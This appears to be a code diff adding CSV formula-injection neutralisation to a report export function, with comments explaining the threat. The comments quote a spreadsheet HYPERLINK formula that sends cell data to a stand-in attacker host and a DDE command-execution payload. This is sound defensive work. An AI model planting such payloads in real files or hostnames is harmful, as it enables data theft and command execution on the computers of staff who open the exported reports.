@@ -40,9 +40,35 @@ function fmtTs(d) {
 }
 
 // ─── CSV ──────────────────────────────────────────────────────────────────────
+// A cell whose text starts with one of these is executed as a FORMULA by Excel,
+// LibreOffice and Google Sheets when the file is opened.
+const FORMULA_START = /^[=+\-@\t\r]/;
+
+// ─── CSV formula injection (CWE-1236) ─────────────────────────────────────────
+//
+// RFC 4180 quoting — the `/[",\n\r]/` test below — makes a cell PARSE correctly. It does
+// nothing about what a spreadsheet DOES with the parsed text: a cell reading
+// `=HYPERLINK("http://attacker/?"&A1,"Open")` is a live formula the moment someone opens
+// the download, and it can read other cells and send them somewhere.
+//
+// That text is reachable. A report `title` comes from the request body
+// (`POST /api/reports`), and device names come from `devices.device_name`, which
+// `agentService.register` fills straight from the **agent-supplied hostname** with no
+// character validation. So a machine enrolling itself as `=cmd|'/c calc'!A1` plants a
+// formula that fires later, on an ICTU staffer's PC, when someone exports a report —
+// the classic stored/deferred shape, in a file the feature exists to hand around.
+//
+// Prefixing with an apostrophe is the standard neutralisation: spreadsheets treat the
+// rest as literal text and hide the quote.
+//
+// ⚠️ Numbers are deliberately exempt. `-12.5` starts with `-`, and prefixing it would turn
+// a real measurement into a text cell — every negative value in the sheet would stop being
+// summable. `Number.isFinite(Number(s))` keeps numeric columns numeric while still
+// catching a lone `-` or `=1+1`, both of which are NaN.
 function csvCell(v) {
   const s = v === null || v === undefined ? "" : String(v);
-  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+  const guarded = FORMULA_START.test(s) && !Number.isFinite(Number(s)) ? `'${s}` : s;
+  return /[",\n\r]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
 }
 function csvRow(arr) {
   return arr.map(csvCell).join(",");
